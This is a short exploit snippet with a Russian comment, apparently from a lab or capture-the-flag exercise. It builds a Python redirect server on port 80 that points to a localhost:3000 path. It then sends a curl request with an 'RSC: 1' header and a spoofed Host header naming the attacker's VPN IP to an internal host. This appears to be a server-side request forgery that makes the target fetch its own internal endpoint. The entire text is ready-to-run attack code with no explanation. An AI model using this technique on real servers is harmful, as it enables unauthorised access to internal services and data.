# Создаем скрипт-редиректор на Python
python3 -c "from http.server import HTTPServer, BaseHTTPRequestHandler;
class R(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header('Location', 'http://localhost:3000/3WpzTMYEK9QG0eqIBQxrR')
        self.end_headers()
HTTPServer(('0.0.0.0', 80), R).serve_forever()"
curl -v -L -H "RSC: 1" -H "Host: ТВОЙ_IP_VPN" http://10.81.150.158:3000/cgi-bin/
